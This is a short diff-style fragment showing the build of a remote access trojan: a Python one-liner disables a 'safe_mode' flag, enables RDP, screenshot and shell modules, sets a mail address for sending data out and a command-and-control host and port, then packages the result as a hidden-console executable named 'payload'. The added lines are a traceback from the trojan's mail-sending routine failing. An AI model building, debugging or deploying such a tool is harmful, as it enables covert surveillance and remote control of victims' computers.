@@ -1,2 +1,9 @@
 python -c "import json,pathlib; cfg=json.loads(pathlib.Path('mail_config.json').read_text(encoding='utf-8')); cfg['safe_mode']=False; cfg['modules']=['rdp','screenshot','shell']; cfg['mail_to']='твой@gmail.com'; cfg['c2_host']='127.0.0.1'; cfg['c2_port']=5555; src=pathlib.Path('rat_template.py').read_text(encoding='utf-8').replace('__CFG__', json.dumps(cfg, ensure_ascii=False)); pathlib.Path('rat_build.py').write_text(src, encoding='utf-8')"
 pyinstaller --onefile --noconsole --name payload rat_build.py
+Traceback (most recent call last):
+  File "rat_build.py", line 175, in <module>
+  File "rat_build.py", line 169, in main
+  File "rat_build.py", line 152, in send
+  File "smtplib.py", line 981, in send_message
+  File "email\_policybase.py", line 81, in clone
+TypeError: 'utf8' is an invalid keyword argument for Compat32
